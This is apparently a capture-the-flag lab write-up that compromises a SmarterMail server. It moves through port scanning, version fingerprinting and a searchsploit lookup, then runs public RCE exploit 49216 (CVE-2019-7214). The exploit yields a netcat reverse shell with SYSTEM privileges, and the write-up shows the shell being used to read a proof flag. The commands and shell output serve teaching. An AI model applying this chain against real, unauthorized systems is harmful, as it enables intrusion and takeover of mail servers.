# NMAP

The command runs a TCP port scan on the target 192.168.141.65 with the `--open` option, which instructs Nmap to only output open ports, filtering out ports reported as closed or filtered. The scan, executed with elevated privileges, discovered six open TCP ports: 21 (FTP), 80 (HTTP), 135 (MSRPC), 139 (NetBIOS), 445 (SMB), and 9998 (a custom service). This result maps the target's primary network services and potential attack vectors, with the web server on port 80 and SMB-related ports being of high interest for further enumeration.

```bash
sudo nmap  192.168.141.65 -- open 

[sudo] password for kali: 
Starting Nmap 7.95SVN ( https://nmap.org ) at 2025-12-17 20:25 UTC
Failed to resolve "open".
Nmap scan report for 192.168.141.65
Host is up (0.014s latency).
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE
21/tcp   open  ftp
80/tcp   open  http
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
9998/tcp open  distinct32

Nmap done: 1 IP address (1 host up) scanned in 2.80 seconds
                                                                
```

The screenshot file "algernon.png" contains a web application login interface for "SmarterMail" which was accessed at the URL [http://192.168.141.65:9998/interface/root#/login](http://192.168.141.65:9998/interface/root#/login). This confirms that the web service on TCP port 9998 is a SmarterMail webmail server front-end. This provides a specific application to target for further reconnaissance, credential-based attacks, or potential exploitation of known vulnerabilities within the SmarterMail application.

![[Pasted image 20251217205751.png]]

The command performed a non-interactive HTTP GET request to the root path of the web application on port 9998 and filtered the HTML response to extract the first ten lines containing script tags. The output reveals the application uses the Angular framework, as indicated by the referenced JavaScript files. The presence of version-specific filenames, "angular-v-100.0.6919.30414.8d65fc3f1d47d00.js" and others, provides a potential version identifier for the SmarterMail application, which can be cross-referenced with known vulnerabilities. This is useful for vulnerability research and fingerprinting the exact software version in use.

```bash

curl -s http://192.168.141.65:9998/interface/root | grep -i '<script' | head -10                 
        <script>
        <script src="/interface/output/angular-v-100.0.6919.30414.8d65fc3f1d47d00.js"></script>
        <script src="/interface/output/vendor-v-100.0.6919.30414.8d65fc3f1d47d00.js"></script>
        <script src="/interface/output/site-v-100.0.6919.30414.8d65fc3f1d47d00.js"></script> 
```

The command queries the SearchSploit exploit database for entries related to "SmarterMail". The results list multiple historical vulnerabilities affecting various versions of the application. Notably, the entries include several Cross-Site Scripting flaws, directory traversal, LDAP injection, and two critical remote code execution exploits for SmarterMail 16 and a specific Build 6985. This reconnaissance confirms the target application has a history of security issues and provides specific exploit code references that must be validated against the discovered version from the previous fingerprinting step.

```bash
searchsploit smartermail               

----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                             |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
SmarterMail 16 - Arbitrary File Upload                                                                                                                     | multiple/webapps/48580.py
SmarterMail 7.1.3876 - Directory Traversal                                                                                                                 | windows/remote/15048.txt
SmarterMail 7.3/7.4 - Multiple Vulnerabilities                                                                                                             | asp/webapps/16955.txt
SmarterMail 8.0 - Multiple Cross-Site Scripting Vulnerabilities                                                                                            | asp/webapps/16975.txt
SmarterMail < 7.2.3925 - LDAP Injection                                                                                                                    | asp/webapps/15189.txt
SmarterMail < 7.2.3925 - Persistent Cross-Site Scripting                                                                                                   | asp/webapps/15185.txt
SmarterMail Build 6985 - Remote Code Execution                                                                                                             | windows/remote/49216.py
SmarterMail Enterprise and Standard 11.x - Persistent Cross-Site Scripting                                                                                 | asp/webapps/31017.php
smartermail free 9.2 - Persistent Cross-Site Scripting                                                                                                     | windows/webapps/20362.py
SmarterTools SmarterMail 4.3 - 'Subject' HTML Injection                                                                                                    | php/webapps/31240.txt
SmarterTools SmarterMail 5.0 - HTTP Request Handling Denial of Service                                                                                     | windows/dos/31607.py
----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

The command attempted to copy the specific remote code execution exploit for SmarterMail Build 6985 (EDB-ID 49216, CVE-2019-7214) from the local SearchSploit database to the current working directory. The output indicates the file was successfully copied as `/home/kali/Downloads/Algernon/49216.py`. This action retrieves the exploit script for local review, modification, and potential testing against the target application to verify if the unpatched vulnerability is present and exploitable for initial access.

```bash
searchsploit smartermail -m windows/remote/49216.py


[!] Could not find EDB-ID #


  Exploit: SmarterMail Build 6985 - Remote Code Execution
      URL: https://www.exploit-db.com/exploits/49216
     Path: /usr/share/exploitdb/exploits/windows/remote/49216.py
    Codes: CVE-2019-7214
 Verified: False
File Type: Python script, ASCII text executable, with very long lines (4852)
Copied to: /home/kali/Downloads/Algernon/49216.py
```


The command creates a copy of the downloaded exploit script `49216.py` and renames it to `exploit.py` in the current directory. This is a standard operational step to preserve the original exploit code while allowing the tester to freely modify the copy for the engagement, such as updating target IP addresses, port numbers, payloads, or debugging the script without altering the source file obtained from the exploit database.

```bash
cp -r   /home/kali/Downloads/Algernon/49216.py  exploit.py
```

The command executes the copied Python exploit script against its default or pre-configured target. Based on the context, this is the remote code execution exploit for SmarterMail Build 6985. Running the script initiates the attack sequence, which likely involves sending a maliciously crafted request to the target SmarterMail server on port 9998. A successful exploitation would result in arbitrary command execution on the underlying Windows host, providing an initial foothold on the target system. The specific outcome of this command, such as a reverse shell connection or command output, is not shown but would be the critical result of this attack step.

```bash
python3  exploit.py
```

The command started a Netcat listener on TCP port 4444. Following the execution of the SmarterMail exploit, a reverse shell connection was received from the target host at 192.168.141.65. The shell operates with `nt authority\system` privileges, confirming a complete compromise of the Windows host. Post-exploitation commands were executed to navigate the filesystem, list user directories, and retrieve the contents of the `proof.txt` file on the Administrator's desktop, which contains the flag `1523f36f4c970ac395eb8f4f044e36fd`. This demonstrates successful remote code execution and establishment of a high-integrity command and control channel.

```bash
nc -lvp 4444                                                       
listening on [any] 4444 ...
192.168.141.65: inverse host lookup failed: Unknown host
connect to [192.168.45.155] from (UNKNOWN) [192.168.141.65] 49822
whoami
nt authority\system
PS C:\Windows\system32> cd ..
PS C:\Windows> cd ..
PS C:\> cd users
PS C:\users> dir


    Directory: C:\users


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----        4/29/2020  10:30 PM                .NET v4.5                                                             
d-----        4/29/2020  10:30 PM                .NET v4.5 Classic                                                     
d-----         5/2/2022   7:05 AM                Administrator                                                         
d-----        4/23/2020   3:16 AM                dean                                                                  
d-----       12/17/2025  12:27 PM                DefaultAppPool                                                        
d-r---        4/22/2020   4:54 AM                Public                                                                


PS C:\users> cd Administrator 
PS C:\users\Administrator> cd Desktop 
PS C:\users\Administrator\Desktop> type proof.txt
1523f36f4c970ac395eb8f4f044e36fd
```